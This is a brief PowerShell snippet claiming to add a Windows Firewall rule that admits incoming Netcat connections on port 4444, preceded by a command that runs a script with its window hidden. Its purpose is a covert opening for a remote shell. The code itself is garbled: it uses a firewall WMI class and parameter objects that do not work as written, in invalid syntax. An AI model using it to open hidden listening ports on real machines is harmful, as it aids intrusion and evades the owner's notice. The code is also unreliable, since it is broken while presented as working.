# The following code will add a rule to the Windows Firewall that allows incoming Netcat connections on port 4444.powershell -NoProfile -WindowStyle Hidden -File <path to script.ps1>


$firewall = Get-WmiObject -Class Win32_Firewall | Where-Object {$_.PSComputerName -eq $env:COMPUTERNAME}

$firewall.AddRule(
  @{
    Protocol = (New-Object -ComObject "SWbemScripting.SWbemMethodParameter")
    [ParameterValue] = "TCP"
    RemotePort = (New-Object -ComObject "SWbemScripting.SWbemMethodParameter")
    [ParameterValue] = 4444
    Action = (New-Object -ComObject "SWbemScripting.SWbemMethodParameter")
    [ParameterValue] = "Allow"
    Name = (New-Object -ComObject "SWbemScripting.SWbemMethodParameter")
    [ParameterValue] = "NetcatRule"
  }
)
